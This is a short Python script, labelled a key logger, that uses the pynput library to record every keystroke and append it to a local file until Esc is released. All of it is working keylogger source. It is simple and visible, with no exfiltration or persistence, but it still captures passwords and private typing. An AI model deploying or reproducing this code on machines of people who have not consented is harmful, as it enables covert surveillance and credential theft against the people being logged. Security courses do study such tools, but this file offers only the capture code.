#key logger
import pynput
from pynput.keyboard import Key, Listener

def on_press(key):
    try:
        with open('keylog1.txt', 'a') as f:
            f.write(key.char)
    except AttributeError:
        with open('keylog1.txt', 'a') as f:
            f.write('special key {0} pressed\n'.format(key))

def on_release(key):
    if key == Key.esc:
       
        return False


with Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
